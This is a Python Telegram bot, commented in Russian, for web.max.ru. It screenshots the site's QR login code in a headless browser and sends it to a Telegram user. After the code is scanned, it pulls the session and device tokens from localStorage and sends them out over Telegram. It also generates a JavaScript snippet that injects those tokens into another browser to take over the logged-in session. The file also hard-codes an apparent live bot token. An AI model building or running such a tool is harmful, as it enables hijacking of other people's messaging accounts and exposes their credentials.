"""
Telegram бот для max.ru - ПОДСТАНОВКА ЗНАЧЕНИЙ
"""

import logging
import asyncio
from io import BytesIO
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import os
import time
import json

# ТОКЕН
TOKEN = "8294429332:AAEQsLd2ZnGM0Z12arZjQZmVK38X1-tJEXY"
URL = "https://web.max.ru"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

driver = None
user_sessions = {}

def get_driver():
    global driver
    if not driver:
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--window-size=1920x1080')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        driver = webdriver.Chrome(options=options)
    return driver

def check_authorization():
    """Проверяет авторизацию"""
    global driver
    try:
        has_auth = driver.execute_script("""
            return localStorage.getItem('__oneme_auth') !== null;
        """)
        return has_auth
    except:
        return False

def get_auth_data():
    """Получает данные авторизации"""
    global driver
    try:
        result = driver.execute_script("""
            return {
                deviceId: localStorage.getItem('__oneme_device_id'),
                auth: localStorage.getItem('__oneme_auth')
            };
        """)
        return result
    except Exception as e:
        logger.error(f"Ошибка получения данных: {e}")
        return None

def format_script(device_id, auth):
    """Форматирует скрипт как в примере"""
    # Пытаемся распарсить auth если это JSON строка
    try:
        auth_data = json.loads(auth) if auth and auth.startswith('{') else auth
        auth_str = json.dumps(auth_data, ensure_ascii=False) if isinstance(auth_data, dict) else auth
    except:
        auth_str = auth
    
    # Форматируем точно как в примере
    script = f"sessionStorage.clear();localStorage.clear();localStorage.setItem('__oneme_device_id', '{device_id}');localStorage.setItem('__oneme_auth', '{auth_str}');window.location.reload();"
    
    return script

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    await update.message.reply_text(
        "👋 **Бот для max.ru**\n\n"
        "🔹 **/qr** - получить скриншот с QR-кодом\n"
        "🔹 Отсканируй QR и войди\n"
        "🔹 **/check** - получить данные и скрипт\n\n"
        "⚡️ Скрипт будет в нужном формате",
        parse_mode='Markdown'
    )

async def qr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение скриншота"""
    user_id = str(update.effective_user.id)
    
    msg = await update.message.reply_text("🔄 Загружаю страницу...")
    
    try:
        driver = get_driver()
        
        # Загружаем страницу
        logger.info("Загружаю страницу...")
        driver.get(URL)
        
        # Ждем загрузки
        await msg.edit_text("⏳ Жду загрузки (15 секунд)...")
        time.sleep(15)
        
        # Делаем скриншот
        logger.info("Делаю скриншот...")
        screenshot = driver.get_screenshot_as_png()
        img_io = BytesIO(screenshot)
        img_io.name = "page.png"
        
        await msg.delete()
        
        # Отправляем скриншот
        await update.message.reply_photo(
            photo=InputFile(img_io, filename="page.png"),
            caption="📸 **Скриншот готов**\n\n"
                    "1️⃣ Найди QR-код на скриншоте\n"
                    "2️⃣ Отсканируй его\n"
                    "3️⃣ Войди на сайт\n"
                    "4️⃣ Напиши **/check**",
            parse_mode='Markdown'
        )
        
        # Сохраняем сессию
        user_sessions[user_id] = {
            'status': 'waiting_scan'
        }
        
        logger.info(f"Скриншот отправлен пользователю {user_id}")
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await msg.edit_text(f"❌ Ошибка: {str(e)[:200]}")

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Проверка входа и получение данных"""
    user_id = str(update.effective_user.id)
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сначала используй /qr")
        return
    
    msg = await update.message.reply_text("🔄 Проверяю вход...")
    
    try:
        # Проверяем авторизацию
        if check_authorization():
            await msg.edit_text("✅ Вход выполнен! Получаю данные...")
            
            # Получаем данные
            data = get_auth_data()
            
            if data and data.get('deviceId') and data.get('auth'):
                device_id = data['deviceId']
                auth = data['auth']
                
                # Форматируем скрипт
                script = format_script(device_id, auth)
                
                # Отправляем результат
                result_text = f"""📊 **ДАННЫЕ АВТОРИЗАЦИИ:**

**Device ID:**
`{device_id}`

**Auth:**
`{auth}`

**ГОТОВЫЙ СКРИПТ:**
```javascript
{script}
```"""
                
                await msg.delete()
                await update.message.reply_text(result_text, parse_mode='Markdown')
                
                # Отправляем скрипт отдельно для удобства копирования
                await update.message.reply_text(
                    f"📋 **СКОПИРУЙ ЭТОТ СКРИПТ:**\n\n`{script}`",
                    parse_mode='Markdown'
                )
                
                # Очищаем сессию
                del user_sessions[user_id]
                
            else:
                await msg.edit_text("❌ Не удалось получить данные авторизации")
        else:
            await msg.edit_text(
                "❌ **Вход не выполнен**\n\n"
                "1️⃣ Убедись что ты отсканировал QR-код\n"
                "2️⃣ Подтверди вход на сайте\n"
                "3️⃣ Попробуй **/check** еще раз",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await msg.edit_text(f"❌ Ошибка: {str(e)[:200]}")

async def main():
    """Главная функция"""
    app = Application.builder().token(TOKEN).build()
    
    # Добавляем обработчики
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("qr", qr_command))
    app.add_handler(CommandHandler("check", check_command))
    
    # Запускаем бота
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    logger.info("✅ Бот запущен! Форматирует скрипты как в примере")
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        if driver:
            driver.quit()
        await app.stop()

if __name__ == "__main__":
    asyncio.run(main())
